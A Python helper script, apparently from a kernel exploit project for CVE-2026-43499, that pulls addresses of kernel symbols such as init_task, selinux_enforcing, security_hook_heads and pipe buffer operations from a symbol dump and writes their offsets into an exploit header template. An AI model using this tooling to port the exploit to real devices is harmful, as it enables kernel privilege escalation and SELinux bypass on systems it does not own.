#!/usr/bin/env python3
"""Generate target.h from symbols.txt for CVE-2026-43499 exploit.

Uses tools/target.h.final as template and patches symbol offsets.
"""

import re
import sys
import io

# Force UTF-8 output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

BASE = 0xffffffc008000000

TARGETS = {
    "init_task": None,
    "selinux_enforcing": None,
    "anon_pipe_buf_ops": None,
    "noop_llseek": None,
    "no_llseek": None,
    "configfs_read_iter": None,
    "configfs_bin_write_iter": None,
    "copy_splice_read": None,
    "ashmem_fops": None,
    "ashmem_misc_fops": None,
    "kmalloc_caches": None,
    "selinux_blob_sizes": None,
    "security_hook_heads": None,
    "empty_zero_page": None,
    "root_task_group": None,
    "init_uts_ns": None,
    "selinux_state": None,
    "kernel_read": None,
    "kernel_write": None,
    "generic_file_read_iter": None,
    "generic_file_write_iter": None,
    "simple_read_from_buffer": None,
    "simple_write_to_buffer": None,
    "pipe_read": None,
    "pipe_write": None,
    "nosteal_pipe_buf_ops": None,
    "init_net": None,
    "init_nsproxy": None,
    "random_boot_id_data": None,
}

ALIASES = {
    "selinux_enforcing": ["selinux_enforcing_boot"],
    "random_boot_id_data": ["sysctl_bootid"],
    "ashmem_misc_fops": ["ashmem_misc"],
    "copy_splice_read": ["generic_file_splice_read"],
}

def match_target(sym):
    for target in TARGETS:
        if TARGETS[target] is None:
            if sym == target:
                return target
            if target in ALIASES and sym in ALIASES[target]:
                return target
    return None

# Read symbols.txt and extract targets
with open("symbols.txt", "r", encoding="utf-8") as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) < 3:
            continue
        addr_str = parts[0]
        sym = parts[2]
        target = match_target(sym)
        if target:
            TARGETS[target] = int(addr_str, 16)

missing = [k for k, v in TARGETS.items() if v is None]
if missing:
    print(f"WARNING: Missing symbols: {missing}")

# Load template
with open("tools/target.h.final", "r", encoding="utf-8") as f:
    template = f.read()

# Replace KIMAGE_TEXT_BASE
template = re.sub(
    r'#define KIMAGE_TEXT_BASE\s+0x[0-9a-fA-F]+ULL.*',
    f'#define KIMAGE_TEXT_BASE               0x{BASE:016x}ULL  /* generated from symbols.txt */',
    template
)

# Replace *_OFF values
for name, addr in TARGETS.items():
    if addr is not None:
        off = addr - BASE
        off_str = f"0x{off:08x}ULL  /* from symbols.txt */"
        pattern = rf'#define {name.upper()}_OFF\s+0x[0-9a-fA-F]+ULL.*'
        replacement = f'#define {name.upper()}_OFF               {off_str}'
        template = re.sub(pattern, replacement, template)

# Output result
print(template)
